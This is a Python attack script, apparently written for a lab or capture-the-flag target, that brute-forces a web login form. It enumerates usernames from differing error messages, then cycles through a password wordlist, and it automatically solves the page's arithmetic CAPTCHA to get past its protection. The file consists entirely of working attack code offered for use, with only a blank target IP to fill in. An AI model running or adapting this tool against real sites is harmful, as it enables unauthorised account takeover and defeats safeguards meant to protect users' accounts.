import re
import sys
import requests
from bs4 import BeautifulSoup

SCHEME = "http://"
IP_ADDRESS = "" # Change This IP Address
PATH = "/login"
FULL_PATH = SCHEME + IP_ADDRESS + PATH
USERNAME_FILE = "./usernames.txt"
PASSWORD_FILE = "./passwords.txt"
CAPTCHA_ERROR_MESSAGE = "Captcha enabled"
MATHEMATICAL_REGEX_PATTERN = r'\d+\s[+\-*]\s\d+\s=\s\?'
DEFAULT_PASSWORD = "thisisafakepassword"

def appendFileLinesToArray(file_name):
    print(f"Loading From: {file_name}\n")
    array = []
    try:
        with open(file_name, 'r') as file:
            for line in file:
                array.append(line.strip())
    except FileNotFoundError:
        print(f"Error: File '{file_name}' not found.")
        sys.exit(1)
    return array

def sendPostAndGetHtml(data):
    print("Sending POST Request And Grabbing HTML From Response")
    response = requests.post(FULL_PATH, data = data)
    html = response.text
    return html

def craftPostData(usern, passw = DEFAULT_PASSWORD):
    print(f"Crafting POST Body Data... Parameters: username, password | Values: {usern}, {passw}")
    return {'username': usern, 'password': passw}

def grabExpressionInCaptcha(html):
    print("Looking For The Mathematical Expression Within Pages Captcha...")
    soup = BeautifulSoup(html, 'html.parser')
    form_element = soup.find('form')
    text_content = form_element.get_text(strip=True)
    expression = re.search(MATHEMATICAL_REGEX_PATTERN, text_content)
    if expression:
        return expression.group()
    else:
        print("Expression not found.")
        return 1

def splitAndSolveExpression(expression):
    print(f"Attempting To Solve The Following CAPTCHA: {expression}")
    expression_pieces = expression.split()
    operand_1 = expression_pieces[0]
    operator = expression_pieces[1]
    operand_2 = expression_pieces[2]
    if operator == '+':
        result = int(operand_1) + int(operand_2)
    elif operator == '*':
        result = int(operand_1) * int(operand_2)
    elif operator == '-':
        result = int(operand_1) - int(operand_2)
    return result

def findPassword(usern):
    print(f"Passwords ", end='')
    passwords = appendFileLinesToArray(PASSWORD_FILE)
    for password in passwords:
        data = craftPostData(usern, password)
        html = sendPostAndGetHtml(data)
        if CAPTCHA_ERROR_MESSAGE in html:
            expression = grabExpressionInCaptcha(html)
            result = splitAndSolveExpression(expression)
            if result:
                print(f"Resending Request With {result} Added To POST 'CAPTCHA' Parameter...")
                data['captcha'] = result
                response_after_captcha = sendPostAndGetHtml(data)
                if f"Invalid password for user &#39;{usern}&#39;" not in response_after_captcha:
                    print(f"Possible password found: {password}\n")
                    return password
                else:
                    print("\n")
            else:
                print("\n")
        else:
            print("CAPTCHA Missing From Page.\n")

def findUsername():
    print(f"Usernames ", end='')
    usernames = appendFileLinesToArray(USERNAME_FILE)
    for username in usernames:
        data = craftPostData(username)
        html = sendPostAndGetHtml(data)
        if CAPTCHA_ERROR_MESSAGE in html:
            expression = grabExpressionInCaptcha(html)
            result = splitAndSolveExpression(expression)
            if result:
                print(f"Resending Request With {result} Added To POST 'CAPTCHA' Parameter...")
                data['captcha'] = result
                response_after_captcha = sendPostAndGetHtml(data)
                if f"The user &#39;{username}&#39; does not exist" not in response_after_captcha:
                    print(f"Possible user found: {username}\n")
                    return username
                else:
                    print("\n")
            else:
                print("\n")
        else:
            print("CAPTCHA Missing From Page.\n")

def main():
    print(f"Program Starting...")
    print(f"Target URL: {FULL_PATH}\n")

    username = findUsername()
    password = findPassword(username)

    print(f"Potential Username And Password Found: {username}:{password}")


if __name__ == "__main__":
    main()
